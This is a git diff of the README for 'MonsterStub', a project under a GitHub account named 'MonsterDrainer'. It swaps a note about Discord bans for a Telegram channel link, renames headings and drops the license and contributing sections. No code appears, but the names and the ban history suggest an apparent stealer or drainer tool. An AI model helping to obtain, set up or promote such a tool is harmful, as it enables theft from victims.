@@ -2,7 +2,7 @@
 
 <div align="center">
    
-   Due to constant Discord terminations I will not be making a new support server. For urgent contact: <a href="https://t.me/officialmonsters">Telegram</a>
+   *this will be private later in the future* Join our Official telegram channel!   <a href="https://t.me/officialmonsters">Telegram</a>
 </div>
 <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
 
@@ -53,7 +53,7 @@
 -   [Python](https://www.python.org/downloads/release/python-3109/)
 -   [Git](https://git-scm.com/download/win)
 
-### Setup
+### Setting it up
 
 1. [Download source code zip](https://github.com/MonsterDrainer/MonsterStub/archive/refs/heads/main.zip)
 2. Extract zip
@@ -69,15 +69,8 @@
     <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://i.imgur.com/7EmPhBc.png"></img>
 </div>
 
-## Contributing
 
-View the [contributing guidelines](CONTRIBUTING.md) for more information on how you can help out.
-
-## License
-
-Monster is licensed under the <a href="https://mit-license.org/">MIT License</a>.
-
-## Errors?
+## Issues?
 
 -   Make an [issue](https://github.com/MonsterDrainer/MonsterStub/issues)
 -   Join the [Telegram](https://t.me/officialmonsters)
